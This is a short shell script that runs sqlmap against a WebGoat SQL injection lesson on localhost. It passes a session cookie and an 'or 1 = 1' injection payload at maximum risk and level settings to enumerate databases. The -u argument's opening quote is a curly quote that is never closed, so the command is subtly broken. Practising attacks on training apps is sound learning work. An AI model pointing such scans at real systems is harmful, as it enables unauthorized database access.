#!/bin/sh

# Your execution path

EXECUTIONPATH="<executionpath>";

PORT="8080";
CONTROLLER="WebGoat";
ENDPOINT="SqlInjection/assignment5a";
CONTENT_TYPE="Content-Type: application/x-www-form-urlencoded; charset=UTF-8";

# Get --cookie

COOKIE=${1#--cookie=};

if [ -z $COOKIE ];
then
	echo 'Cookie parameter must be provided. Try with --cookie=<value>';
	exit 1;
fi

# Sql injection with dbms specified

$EXECUTIONPATH/sqlmap.py -u “http://localhost:$PORT/$CONTROLLER/$ENDPOINT \
	--data "account=Smith&operator=or&injection=1+%3D+1" \
	-p "account" \
	-b \
	--dbs \
	-v 4 \
	--risk=3 \
	--level=5 \
	--cookie="JSESSIONID=$COOKIE; Path=/WebGoat; HttpOnly;" \
	-H "$CONTENT_TYPE";